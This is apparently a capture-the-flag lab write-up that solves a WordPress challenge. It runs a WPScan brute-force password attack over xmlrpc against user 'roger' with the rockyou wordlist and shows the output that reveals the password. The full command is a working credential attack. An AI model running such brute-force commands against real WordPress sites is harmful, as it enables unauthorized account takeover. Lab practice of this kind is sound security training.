
## Challenge 1

Perform a bruteforce attack against the user "roger" on your target with the wordlist "rockyou.txt". Submit the user's password as the answer.

## Solution 1

Start the password attack on xmlrpc using WPScan.

```sh
wpscan --password-attack xmlrpc -t 20 -U roger -P rockyou.txt --url http://94.237.58.244:48092
```

After a short time of brute forcing, it found the password for the user **roger**.

```sh
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - roger / lizard                                                                                                         
Trying roger / 8675309 Time: 00:00:48 <                                                   > (1900 / 14346291)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: roger, Password: lizard
```

